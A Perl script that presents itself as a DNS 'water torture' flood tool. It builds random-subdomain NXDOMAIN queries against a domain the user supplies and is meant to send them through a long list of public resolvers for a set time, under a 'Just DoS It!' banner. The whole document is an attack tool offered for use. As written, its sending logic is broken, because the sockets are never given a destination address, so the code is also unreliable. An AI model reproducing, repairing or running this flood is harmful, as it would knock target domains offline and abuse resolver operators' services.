#!/usr/bin/perl
# DNS Water Torture Flood (NXDOMAIN)

use strict;
use warnings;
use Socket;

if (@ARGV != 2) {
    die "\r\n\tUsage: perl $0 <domain> <time>\r\n\r\n";
}

my ($domain,$time) = @ARGV;

my $test = inet_aton("$domain")
    or die "\r\n\tResolution error.\r\n";

$time = 30 if $time < 5 || $time > 3600;

my @connx;
my @chars = ('a'..'z', 'A'..'Z', 0..9);

my @resolvers = (
    "8.8.8.8",        "8.8.4.4",         # Google Inc.
    "1.1.1.1",        "1.0.0.1",         # CloudFlare
    "9.9.9.9",        "149.112.112.112", # Quad9
    "208.67.222.222", "208.67.220.220",  # OpenDNS
    "185.228.168.9",  "185.228.169.9",   # Clean Browsing
    "94.140.14.14",   "94.140.15.15",    # AdGuard DNS
    "77.88.8.8",      "77.88.8.1",       # Yandex
    "76.76.2.0",      "76.76.10.0",      # Control D
    "76.76.19.19",    "76.223.122.150",  # Alternate DNS
    "84.200.69.80",   "84.200.70.40",    # DNS WATCH
    "91.239.100.100", "89.233.43.71",    # Uncensored DNS
    "193.17.47.1",    "185.43.135.1",    # CZ.NIC
    "156.154.70.1",   "156.154.71.1",    # Neustar UltraDNS
    "45.90.28.0",     "45.90.30.0",      # Next DNS
    "37.235.1.174",   "37.235.1.177",    # Free DNS
    "164.124.101.2",  "203.248.252.2",   # LG Dacom Corporation
    "83.137.41.8",    "83.137.41.9",     # Informationstechnologie OG, Austria (nemox.net)
    "64.6.64.6",      "64.6.65.6",       # VeriSign Global Registry Services
    "5.11.11.5",      "5.11.11.11",      # Liquid Telecommunications Ltd
    "8.26.56.26",     "8.20.247.20",     # Comodo/Sectigo
    "83.145.86.7",    "83.145.86.8",     # Completel SAS
    "185.228.168.9",  "185.228.169.9",   # Daniel Cid
    "223.5.5.5",      "223.6.6.6",       # Aliyun Computing Co. Ltd
    "139.18.25.33",   "139.18.25.34",    # Universitaet Leipzig
    "80.80.80.80",    "80.80.81.81",     # Freedom Registry BV (Open TLD)
    "200.248.178.54",                    # Claro S.A Resolver Node
    "200.33.3.123",                      # Universidad LatinoAmericana S.C.
    "84.236.142.130",                    # ServiHosting Networks S.L.
    "103.18.138.20",                     # The Virus Centre Ltd
    "139.59.218.207",                    # Bancuh Adblock DNS
    "139.59.219.245",                    # Digital Ocean (Singapore Node)
    "194.72.35.194",                     # British Telecommunications PLC
    "74.82.42.42",                       # Hurricane Electric
    "200.160.0.8",                       # NIC.BR
    "103.168.90.81",                     # Micro Network
    "209.150.154.1",                     # CMPak Limited
    "103.23.150.89",                     # MHSDC2011/MHS Digital Corp
    "61.8.0.113"                         # Pacific Internet
);

foreach my $resolver (@resolvers) {
    my $iaddr = inet_aton($resolver);

    unless ($iaddr) {
        next;
    }

    my $sock;
    if (socket($sock, PF_INET, SOCK_DGRAM, 17)) {
        push @connx, $sock;
    }
}

print "\r\n" x 20;

print <<'EOF';

                                               ▄▄▀
          ▄▀                              ▄▄█▀▀
        ▄█                          ▄▄▄███▀▀ 
       ██                      ▄▄▄█████▀▀   
      ███               ▄▄▄████████▀▀       
     █████        ▄▄▄█████████▀▀            
    ████████▄▄▄▄██████████▀▀                
    ██████████████████▀▀                    
     █████████████▀▀                        
      ▀██████▀▀                             
    
                NIKE - Just DoS It!

EOF

print "\r\nSending gift baskets to " . $domain . " for " . $time . " seconds. CTRL+C to abort...\r\n";

my $quit = time() + $time;

for (;time() <= $quit;) {

    my $len = 5 + rand(5);

    my $header  = pack('n6', 
        int(rand(65535)), # TXID
        0x0100,           # Flags
        1, # QD count
        0, # AN count
        0, # NS count
        0  # AR count
    );

    my $question = "";

    my $prsd = (join '', map { $chars[rand @chars] } 1 .. $len) . "." . $domain;

    foreach my $part (split(/\./, $prsd)) {
        $question .= pack('C', length($part)) . $part;
    }
    $question .= pack('C', 0);

    $question .= pack(
        'nn',
        1, # A (IPv4) record
        1  # IN class
    );

    my $request = $header . $question;

    foreach my $conn (@connx) {
        send($conn, $request, 0);
    }
}

close($_) foreach @connx;
exit(0);
